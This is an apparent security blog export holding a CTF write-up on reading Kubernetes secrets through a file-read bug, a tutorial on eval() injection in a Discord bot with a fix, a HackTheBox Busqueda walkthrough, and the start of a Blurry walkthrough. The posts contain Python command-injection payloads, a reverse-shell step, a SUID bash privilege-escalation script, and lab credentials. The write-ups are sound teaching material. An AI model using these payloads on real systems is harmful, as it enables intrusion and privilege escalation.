[{"content":"Hello everyone! Welcome to the writeup for a challenge called \u0026lsquo;Silly Cloud\u0026rsquo; from TUCTF 24. I found this challenge both fun and challenging! It revolved around interacting with the internet-facing REST API of Kubernetes (K8s).\nLooking around the web The interface of this website is shown in the screenshot below. It was essentially a cloud control manager, and I started poking around the website to look for anything interesting (if I could find something, lol). Interestingly, the dashboard for each function had a \u0026lsquo;Deploy\u0026rsquo; button, but all of them threw errors. BUTTT BUTTTT SIRRRR, something simple yet sneaky caught my attention! üòÇ I discovered a sweet and straightforward LFI (Local File Inclusion) in the \u0026lsquo;View Logs\u0026rsquo; button, which redirected to the /logs?service=registry endpoint. Using this, I could easily traverse the filesystem and read local files like /etc/passwd, /etc/hosts, and more‚Äîwell, as long as the web service had permission. üòè\nTroll begin here Since I found the LFI, my first move was to try reading the flag from common directories where it might be stored, like ../../../flag.txt and other parts of the filesystem. But nope‚Äîno luck. I mean, it shouldn‚Äôt be that easy, especially since this challenge was marked as \u0026lsquo;Medium,\u0026rsquo; haha.\nSo, my next plan was to read the source code of the app to figure out what was going on. But first, I had to figure out what kind of app this even was!\nI randomly visited a non-existent endpoint, /ddd, and the server responded with a \u0026lsquo;Not Found\u0026rsquo; page. This type of response felt pretty familiar‚Äîit‚Äôs common for Python Flask applications. Since I have decent experience working with Flask, I suspected the app might be built using it.\nSo, my next move was to read the source code of files ending with .py to dig deeper into the application. I tried accessing random non-existent directories in the filesystem, and this revealed the default directory the application was looking at: logs/*. For some reason, my brain pointed me toward the idea that the source code should be in a directory one level back. It‚Äôs probably named either main.py or app.py, as that‚Äôs common practice for naming the main file in most Flask web applications.\nI managed to retrieve the source code of the app by exploiting the LFI and accessing /logs?service=../app.py. Bingo! This gave me the full source code of the application.\nBUT BUT BUT\u0026hellip; is it actually bingo yet?! LMAO!!! Let‚Äôs find out!\nInstead of throwing the entire source code at you, let me just highlight the interesting route here:\n1 2 3 @app.route(\u0026#39;/api/secrets\u0026#39;) def get_flag(): return subprocess.check_output([\u0026#39;cat\u0026#39;, \u0026#39;flag.txt\u0026#39;]) I‚Äôm sure you can guess what this does.\n1 2 3 4 5 ‚ï≠‚îÄrezy@dev ~ ‚ï∞‚îÄ‚û§ curl https://silly-cloud.tuctf.com/api/secrets Tr0lL{this_is_a_fake_flag} Look deeper! There is a hidden flag somewhere in the cloud! You probably guessed it‚Äîit\u0026rsquo;s a troll, haha! üòÜ So, this route actually tells us a lot about the challenge. It‚Äôs not just about getting the flag directly; we need to dig deeper to find the real flag. And yep, it\u0026rsquo;s somewhere in the \u0026lsquo;CLOUD\u0026rsquo;.\nEnumerating More into File System At the time of writing this writeup, I already know the actual path to look at, but when I was attempting the challenge, it was a real pain in the ass to sift through all the different paths. The end result, though, was such a blessing. So, I‚Äôll just point out the interesting paths here. If you ever find yourself in a similar LFI situation, feel free to ask any LLMs for more paths to enumerate (because, honestly, that‚Äôs what I did! A lot of the interesting paths were suggested by LLMs, haha).\nI first checked /logs?service=../../../proc/mounts, which lists mounted services (or whatever they are). This pointed me to /run/secrets/kubernetes.io/serviceaccount/, and with this path, I was pretty sure the challenge was related to Kubernetes. So, I started researching Kubernetes since I‚Äôm not super familiar with Kubernetes security. I had to read up on the documentation to understand how to access it, especially since all I had was an LFI vulnerability. Most of the blogs I found about accessing Kubernetes involved kubectl, and I initially thought it was only useful if you had a shell.\nBut more research eventually led me to this particular page in the Kubernetes documentation.\nToken \u0026amp; Certificate The documentation also pointed out where to find the token and certificate needed to access the pods or secrets in Kubernetes.\n/var/run/secrets/kubernetes.io/serviceaccount/token contains the JWT token used to authenticate with Kubernetes when accessing it.\n/var/run/secrets/kubernetes.io/serviceaccount/ca.crt is the internal certificate authority (CA) used for secure communication.\nWith both of these pieces of information, we could easily use curl to enumerate the Kubernetes API:\n1 curl --cacert /path/to/ca.crt --header \u0026#34;Authorization: Bearer \u0026lt;JWT-TOKEN\u0026gt;\u0026#34; -X GET \u0026lt;API-SERVER\u0026gt;/api This would allow us to interact with the Kubernetes API server.\nCloud Part Internet Facing Server Now, the main task was to find or search for the internet-facing Kubernetes API server. While the documentation covered how to access the API directly from within the pods, our focus was on locating the internet-facing API. The documentation provided the following information, which helped me track down the API server. This led me to check the environment variables using the LFI we had. Yay!\nI checked the following file: /logs?service=../../../proc/self/environ for environment variables, and it had a ton of useful information for this challenge. (Yeah, I didn‚Äôt spot the most informative details at first‚Äîit took a few hours before I finally saw it.) Anyway, here are a few interesting ones:\n1 2 DEV_CLUSTER_ADDR=https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com SECRETS_NAMESPACE=secret-namespace The DEV_CLUSTER_ADDR pointed me to the Kubernetes cluster\u0026rsquo;s address (The Internet-Facing API), and SECRETS_NAMESPACE gave me the namespace for the secrets.\nTrouble with cURL I was using cURL the whole time with the following command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ‚ï≠‚îÄrezy@dev ~ ‚ï∞‚îÄ‚û§ curl -k -H \u0026#34;Authorization: Bearer \u0026lt;TOKEN\u0026gt;\u0026#34; https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com/api/v1/ { \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, \u0026#34;groupVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;resources\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;bindings\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;binding\u0026#34;, \u0026#34;namespaced\u0026#34;: true, \u0026#34;kind\u0026#34;: \u0026#34;Binding\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;create\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;componentstatuses\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;componentstatus\u0026#34;, \u0026#34;namespaced\u0026#34;: false, \u0026#34;kind\u0026#34;: \u0026#34;ComponentStatus\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;get\u0026#34;, \u0026#34;list\u0026#34; ], [....//snip//.....] But all I got was a \u0026lsquo;forbidden\u0026rsquo; error when accessing secrets. Then, I discovered that kubectl can be used remotely.\nKubectl Installation We can find the installation guide for kubectl here.\nEndgame Then, using the kubectl documentation, I ran the following command to list the namespaces/files that the current user (based on the JWT token we have) can access:\n1 2 3 4 5 kubectl auth can-i --list \\ --server=https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com \\ --token=\u0026lt;TOKEN\u0026gt; \\ --certificate-authority=ca.crt \\ --namespace=secret-namespace\\ This command helped me figure out what I had permission to access.\nIt will list an interesting resource called top-secret-flag. Use the following command to read the secret from top-secret-flag in the secret-namespace namespace:\n1 2 3 4 5 6 kubectl get secret top-secret-flag \\ --server=https://7b9fc16d-5421-47b3-ab64-83dfee3050eb.k8s.ondigitalocean.com \\ --token=\u0026lt;JWT-TOKEN\u0026gt; \\ --certificate-authority=ca.crt \\ --namespace=secret-namespace \\ -o yaml This command lists information, and within it, we find our flag‚ÄîTUCTF{3ven_m04r_51lly_d3f4ul75}‚Äî(base64 encoded version though). Decoding it gives us the actual flag, and with that, the challenge is solved!\nConclusion Thanks for showing interest in my writeup! It was a fun challenge to solve. We managed to secure 40th position in this CTF, and this particular challenge was my personal favorite‚Äîit was a blast giving it a try. I learned a lot about Kubernetes, pods, and namespaces, and it was a great reminder that real learning happens outside of our comfort zones!\nThanks once again! See you in the next writeup! üòÑ\n","permalink":"http://localhost:1313/writeups/ctf/silly-cloud-from-tuctf-24/","summary":"The \u0026ldquo;Silly Cloud\u0026rdquo; challenge in TUCTF 24 involved exploiting Kubernetes security through LFI to access an internet-facing API.","title":"Silly Cloud From TUCTF 24"},{"content":"Hello, everyone! In this blog, I want to showcase a dangerous function that, if used improperly, can cause serious harm, whether in a web app or elsewhere. In this article, I‚Äôll focus on the abuse of eval() in Discord bots. While it\u0026rsquo;s rare to find it, if you ever come across it or discover that a bot is using it, it\u0026rsquo;s incredibly dangerous.\nIntroduction For this demonstration, I‚Äôll be using the Discord bot source code I wrote for the WSC CTF 2024 Qualifier. The bot was titled \u0026ldquo;Evil-Bot\u0026rdquo;. I won‚Äôt go into too much detail, but here‚Äôs the screenshot I shared with them: The screenshot already provided most of the hints needed to solve the CTF. However, we won‚Äôt be using the image or inviting the bot using the client ID from the screenshot, as the bot is now down. Instead, I encourage you to set up the bot locally using Docker and abuse it in that environment.\nDownload and Setup Since I don\u0026rsquo;t want to go over how to download the bot‚Äôs source code and set it up in your local environment, I‚Äôve written a detailed README.md on how to get the source code and bring the Discord bot online. You can find it in the GitHub repository here: https://github.com/Rezy-Dev/Evil-Bot\nYou will need to install Docker Engine, which you can do by following the instructions here: https://docs.docker.com/engine/install/ubuntu/ (this link is for Ubuntu, but you can find installation instructions for other distributions in the documentation). If you\u0026rsquo;re using Windows or macOS, you can also find installation guides on the same website.\nAbout The Bot Before starting the exploitation and looking at source code, we will generally learn how the asset works. In this case, we will learn how the discord bot works and what feature it gives us.\nBelow is an image of the !help command, which lists all the other commands that can be used. Without wasting much time looking at each commands, let me give you general overview of what the following command does using following table: Accessing vulnerable function So we will use !work for few times until we have enough cash to purchase calculator. The calculator costs $500 if you check the source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 @bot.command() async def buy(ctx, item): data = load_data() user_id = str(ctx.author.id) if item.lower() == \u0026#34;calculator\u0026#34;: cost = 500 ## THIS IS THE COST OF CALCULATOR if user_id not in data[\u0026#34;users\u0026#34;] or data[\u0026#34;users\u0026#34;][user_id][\u0026#34;cash\u0026#34;] \u0026lt; cost: await ctx.send(\u0026#34;You don\u0026#39;t have enough cash to buy the calculator.\u0026#34;) return data[\u0026#34;users\u0026#34;][user_id][\u0026#34;cash\u0026#34;] -= cost data[\u0026#34;users\u0026#34;][user_id][\u0026#34;calculator\u0026#34;] = True save_data(data) await ctx.send(\u0026#34;You have purchased the calculator!\u0026#34;) When I purchase !buy calculator we get access to !calculator command. And we can use following command to calculate: This seems interesting, doesn‚Äôt it? The bot directly accepts the input !calculator \u0026lt;math expression\u0026gt;, calculates it, and shows us the result.\neval() is actually evil How is it directly accepting both the operator and operand from the user and calculating the result? It‚Äôs all thanks to the eval() function.\nThe eval() function in Python takes a string and evaluates it as a Python expression. It can execute any valid Python code within the string passed to it. For example:\n1 2 3 expression = \u0026#34;3 + 5 * 2\u0026#34; result = eval(expression) print(result) # Output: 13 In this example, eval() takes the string \u0026quot;3 + 5 * 2\u0026quot;, evaluates it as a Python expression, and returns the result 13.\nIt can execute arbitrary Python code, return a result, or perform operations based on the expression passed. In essence, it works like the interactive console in Python, where you can enter Python code, and the interpreter executes it immediately.\nHow Does eval() Work? eval() operates by parsing the string expression and evaluating it as Python code. Here‚Äôs the basic process:\nString to Code: The string passed to eval() is parsed into Python bytecode. Execution: The bytecode is executed in the current environment (i.e., it can access variables, functions, and objects defined in the current scope). Return Value: The result of the expression is returned. It works in a very similar way to the Python interactive shell. In the interactive shell, you type in a Python expression, and the interpreter immediately evaluates and returns the result:\n1 2 3 4 5 6 ‚ï≠‚îÄrezy@dev ~ ‚ï∞‚îÄ‚û§ python3 Python 3.12.3 (main, Sep 11 2024, 14:17:37) [GCC 13.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; 3 + 5 * 2 13 This is almost identical to how eval() functions. It evaluates an expression and gives you an immediate result.\nThe Risks of eval() While eval() is incredibly flexible and powerful, it comes with severe security risks. The most dangerous aspect of eval() is that it can execute arbitrary code. This makes it a prime target for exploitation if user input is not properly sanitized.\nLet\u0026rsquo;s exploit eval() Since we have the Discord bot, which uses the eval() function for the !calculator command, we can exploit it for remote code execution.\nSince we know the Discord bot uses the !calculator 1+1 command, which is evaluated using the eval() function, we can abuse this by importing the os module and calling a function of our choice to execute system commands on the host system. For example, we can execute the following command:\n1 !calculator __import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() This exploits the eval() function to import the os module, use popen() to execute the whoami system command, and then return the result, which will reveal the username of the current system user (i.e, bot_user if you check Dockerfile). If we check the source code of the bot, we can see the vulnerable code that directly passes the user\u0026rsquo;s input to the eval() function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @bot.command() async def calculator(ctx, *, expression): data = load_data() user_id = str(ctx.author.id) if user_id not in data[\u0026#34;users\u0026#34;] or not data[\u0026#34;users\u0026#34;][user_id].get( \u0026#34;calculator\u0026#34;, False ): await ctx.send(\u0026#34;You don\u0026#39;t own calculator bro.\u0026#34;) return try: result = eval(expression) await ctx.send(f\u0026#34;The result of `{expression}` is `{result}`.\u0026#34;) except Exception as e: await ctx.send(f\u0026#34;Error in calculation! :warning:\u0026#34;) We can even read files on the system like this: Containerization made it somewhat safer Since we were running the bot in a Docker container, the remote code execution (RCE) was limited to the container and not the main system. However, if the container itself is vulnerable, it could be escaped, leading to a serious security issue. Therefore, it‚Äôs crucial to practice both safe coding and secure deployment.\nSafe Deployment For safe deployment of a Discord bot (or any other app) in a Docker container, it\u0026rsquo;s essential to implement strict security controls to minimize potential risks. First, disable root access within the container by ensuring the bot runs as a non-privileged user, which reduces the impact of any exploitation.\nLimit the commands and system calls that can be executed inside the container by using Docker‚Äôs security features, such as setting restrictive capabilities and mounting only necessary volumes.\nAdditionally, make sure the container‚Äôs network access is tightly controlled, preventing any unnecessary exposure to the host or external services. Regularly update the container images to ensure they include the latest security patches, and consider using Docker\u0026rsquo;s built-in features like read-only file systems or limiting container resources to further minimize attack surfaces.\nSecure Coding Do you think safe deployment alone is enough? The answer is a big NO! An attacker can still penetrate and enumerate how the deployment is configured and how the code is written, which makes the asset vulnerable. Therefore, it\u0026rsquo;s crucial to limit how users provide input to further reduce potential risks.\nInput validation and sanitization are essential to ensure that only expected and safe inputs are processed by your code. In the case of our Discord bot, using the eval() function to directly evaluate user-provided input can lead to severe security issues, such as remote code execution (RCE). Even though safe deployment practices can isolate the environment, an attacker can still exploit vulnerabilities in the code. It is crucial to validate and limit the scope of what users can submit, especially when dealing with potentially dangerous functions like eval().\nFixing the Code to Make It Safer Instead of directly passing user input to eval(), we should sanitize and validate the input to ensure that it only contains safe mathematical expressions. One way to achieve this is by using libraries like ast.literal_eval() or writing a custom parser for mathematical expressions.\nHere\u0026rsquo;s a safer alternative with input validation:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import discord from discord.ext import commands import random import json import os import re # Importing Regular Expression used for Validation [..SNIP..] @bot.command() async def calculator(ctx, *, expression): data = load_data() user_id = str(ctx.author.id) if user_id not in data[\u0026#34;users\u0026#34;] or not data[\u0026#34;users\u0026#34;][user_id].get(\u0026#34;calculator\u0026#34;, False): await ctx.send(\u0026#34;You don\u0026#39;t own calculator bro.\u0026#34;) return # Validate the input to allow only numbers, operators, and parentheses if not re.match(r\u0026#39;^[0-9+\\-*/().\\s]*$\u0026#39;, expression): await ctx.send(\u0026#34;Invalid input! Only numbers and basic arithmetic operators are allowed.\u0026#34;) return try: result = eval(expression) # Safe now since input is validated await ctx.send(f\u0026#34;The result of `{expression}` is `{result}`.\u0026#34;) except Exception as e: await ctx.send(f\u0026#34;Error in calculation! :warning:\u0026#34;) DISCORD_TOKEN = os.getenv(\u0026#34;DISCORD_TOKEN\u0026#34;) bot.run(DISCORD_TOKEN) Best Practices for Using eval() Using eval() in code can be risky, but if it‚Äôs absolutely necessary, there are several steps you can take to minimize the risks. First, you should limit the scope in which eval() operates by using the globals and locals parameters. This helps control the environment and prevents access to dangerous functions. For example, you can restrict built-in functions like os.system() from being accessed by passing {\u0026quot;__builtins__\u0026quot;: None}.\n1 result = eval(expression, {\u0026#34;__builtins__\u0026#34;: None}, {}) Another key practice is validating and sanitizing user input to ensure that only safe characters and expressions are passed to eval(). This helps avoid malicious code execution. If possible, it‚Äôs better to avoid using eval() altogether and consider safer alternatives. For example, you could use libraries like ast.literal_eval() for parsing simple data types or simpleeval for evaluating mathematical expressions, which are far less risky than eval().\nAdditionally, error handling is crucial when using eval(). Wrapping the evaluation in a try-except block helps prevent unexpected crashes, handles errors gracefully, and ensures that the error message is not revealed verbosely to the user.\nConclusion In this blog, we explored the vulnerabilities of the \u0026ldquo;Evil-Bot,\u0026rdquo; a Discord bot, specifically focusing on the security risks posed by the use of the eval() function. By containerizing the bot using Docker, we mitigated the impact of any potential Remote Code Execution (RCE) attacks, as the bot\u0026rsquo;s code was isolated within a secure environment. However, containerization alone is not enough to ensure complete security. It\u0026rsquo;s crucial to adopt secure coding practices, such as validating user input and avoiding dangerous functions like eval(), to prevent malicious exploitation.\nIn production environments, isolating applications through containerization is a best practice, but securing the code itself remains paramount. I encourage all developers to adopt safer coding techniques, implement strict input validation, and leverage isolation methods like Docker to protect against vulnerabilities in production bots. By doing so, we can significantly reduce the risks of RCE and create more secure, reliable applications.\n","permalink":"http://localhost:1313/writeups/ctf/learn-how-eval-function-is-evil-for-discord-bots/","summary":"Learn how eval() function is evil for discord bots (or in Any App)","title":"Why You Shouldn't Use eval() in Discord Bots (or in Any App)"},{"content":" Link: https://app.hackthebox.com/machines/Busqueda Difficulty Easy Machine Linux Enumeration Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk= | 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK 80/tcp open http syn-ack Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 (http) I added searcher.htb to my /etc/hosts file and checked the site. This is what the site looks like: After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.\nExplanation of the Vulnerability In file¬†src/sarchor/main.py¬†of¬†Searchor \u0026lt;= 2.4.2¬†there is a function call¬†eval():\n1 2 3 4 5 6 7 8 9 10 11 @click.argument(\u0026#34;query\u0026#34;) def search(engine, query, open, copy): try: url = eval( # \u0026lt;\u0026lt;\u0026lt; HERE f\u0026#34;Engine.{engine}.search(\u0026#39;{query}\u0026#39;, copy_url={copy}, open_web={open})\u0026#34; ) click.echo(url) searchor.history.update(engine, query, url) if open: click.echo(\u0026#34;opening browser...\u0026#34;) ... This makes it vulnerable to command injection since the input isn\u0026rsquo;t sanitized. We can use the following payloads for command injection:\n__import__('os').system('\u0026lt;CMD\u0026gt;') __import__('os').popen('\u0026lt;CMD\u0026gt;').read() etc PoC \u0026amp; Exploit I found a nice little exploit for this here: Exploit for Searchor 2.4.0 - Arbitrary CMD Injection.\nAll I did was clone the repository and run the exploit.sh proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337. After the script executes, I see a reverse shell of the user svc pop up in our listener, and we also obtain our user.txt flag.\nPrivilege Escalation to Root I looked around the system and found two nice info. At /home/svc there is a folder .gitconfig:\n1 2 3 4 5 6 7 svc@busqueda:~$ cat .gitconfig cat .gitconfig [user] email = cody@searcher.htb name = cody [core] hooksPath = no-hooks I looked around the system and found two interesting pieces of information. In /home/svc, there is a folder named .gitconfig: Here, credentials are supplied using the URL scheme to gitea.searcher.htb. I will add this to my /etc/hosts file and then try to access it. I might use the credentials there to find something useful.\nAnd yes, cody:jh1usoih2bkjaspwe92 worked! Yay! However, I didn\u0026rsquo;t find anything useful on the website.\nI performed a random sudo -l check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.\n1 2 3 4 5 6 7 8 9 svc@busqueda:/var/www/app/.git$ sudo -l -S [sudo] password for svc: jh1usoih2bkjaspwe92 Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * And we have a possible vector for root as well. However, the fact that we can\u0026rsquo;t read the source code for this file means we are restricted to execute permission here.\nI tried the following test argument, which lets us know the allowed arguments.\n1 2 3 4 5 6 7 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test \u0026lt;usr/bin/python3 /opt/scripts/system-checkup.py test Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup Using sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps lists two containers running: gitea and mysql.\nWe can probably retrieve some sort of credentials from the MySQL container. We can try using docker inspect.\n1 2 3 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026lt;thon3 /opt/scripts/system-checkup.py docker-inspect Usage: /opt/scripts/system-checkup.py docker-inspect \u0026lt;format\u0026gt; \u0026lt;container_name\u0026gt; We need the format and the container name in order to inspect the Docker container. We know the container name, but we need the format. I found this: Docker Formatting Documentation, which explains how the formatting works.\nSo I ran the following command (the jq . part is for JSON formatting; learn more about jq here):\n1 sudo python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq . I also found the database password here:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ] I\u0026rsquo;m not sure how useful the database password might be, but let\u0026rsquo;s see.\nI want the instance\u0026rsquo;s IP address. For that, I found this formatting on this site: I will modify it for my use case like this:\n1 sudo python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .NetworkSettings.Networks}}\u0026#39; mysql_db | jq . Which outputs the following:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 { \u0026#34;docker_gitea\u0026#34;: { \u0026#34;IPAMConfig\u0026#34;: null, \u0026#34;Links\u0026#34;: null, \u0026#34;Aliases\u0026#34;: [ \u0026#34;f84a6b33fb5a\u0026#34;, \u0026#34;db\u0026#34; ], \u0026#34;NetworkID\u0026#34;: \u0026#34;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;bf915680ed570128582ba98f8f91606a9941f07c1b0bf344155b9bb360722475\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.19.0.1\u0026#34;, \u0026#34;IPAddress\u0026#34;: \u0026#34;172.19.0.3\u0026#34;, \u0026#34;IPPrefixLen\u0026#34;: 16, \u0026#34;IPv6Gateway\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GlobalIPv6Address\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;GlobalIPv6PrefixLen\u0026#34;: 0, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:13:00:03\u0026#34;, \u0026#34;DriverOpts\u0026#34;: null } } I know the IP address, database username, and database password, so let\u0026rsquo;s try to connect to the MySQL database.\n1 mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea I tried to extract all user information, but it didn\u0026rsquo;t fit properly in the terminal. So I only tried to display interesting information, so I used the query SELECT name, email, passwd FROM user;, which reveals the user\u0026rsquo;s password here. I tried to crack the password but had no success. After a while, I reused the database password as the administrator\u0026rsquo;s password to see if the admin credentials and database credentials were the same.\nTo my surprise, administrator:yuiu1hoiu4i5ho1uh worked, and I am in.\nThere is a private repository in the admin profile, which contains the scripts we found in the /opt/scripts directory. Since we now have the source code for these scripts, we may try to use them to exploit the script and gain root access. Since we are most interested in system-checkup.py, as the user svc can run it as root, I looked at its source code and found something interesting. The script runs ./full-checkup.sh when we supply the argument full-checkup. If we run system-checkup.py with the argument full-checkup, it prints \u0026quot;Something went wrong\u0026quot;. You may ask why. It\u0026rsquo;s because of the try-except block being used. It attempts to run ./full-checkup.sh, but since the file isn\u0026rsquo;t present in the current directory from which we are running the script, it fails.\nWe can now try to exploit the system-checkup.py script by creating our own full-checkup.sh script in the /tmp directory and running the command from there. In our custom-made script full-checkup.sh, I will essentially make /bin/bash a SUID executable binary so I can easily gain root access.\nI created the following script and granted it execute permission.\n1 2 3 4 svc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash chmod u+s /bin/bash Now I will run the following command, and we should have our bash binary set as a SUID executable.\n1 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup We no longer receive the \u0026quot;Something went wrong\u0026quot; error, which means our bash script ran successfully. We should have root access now. Conclusion Thanks for reading my walkthrough. This box was nice and was part of TJNull\u0026rsquo;s \u0026ldquo;NetSecFocus Trophy Room.\n","permalink":"http://localhost:1313/writeups/hackthebox/busqueda/","summary":"Busqueda is an easy Linux machine involving command injection in a Python module for initial access. Privilege escalation is achieved by abusing a root-executable system checkup script with a relative path vulnerability, discovered via Gitea creds and repo analysis.","title":"Busqueda Writeup - HackTheBox"},{"content":" Link: https://app.hackthebox.com/machines/Blurry Difficulty Medium Machine Linux Enumeration I performed a quick Nmap scan on the target to identify open ports:\n1 2 3 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:\nsudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0) | ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E= | 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw= | 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://app.blurry.htb/ |_http-server-header: nginx/1.18.0 I discovered that the HTTP server is hosted at blurry.htb, and the Nmap results also revealed app.blurry.htb. To access these web pages, I added both domains to the /etc/hosts file using the following command:\n1 echo \u0026#34;10.10.11.19 blurry.htb app.blurry.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts I also ran a Gobuster vhost scan to search for additional subdomains:\n1 gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain Surprisingly, the scan revealed more subdomains. I added all of them to the /etc/hosts file as well:\n1 echo \u0026#34;10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts 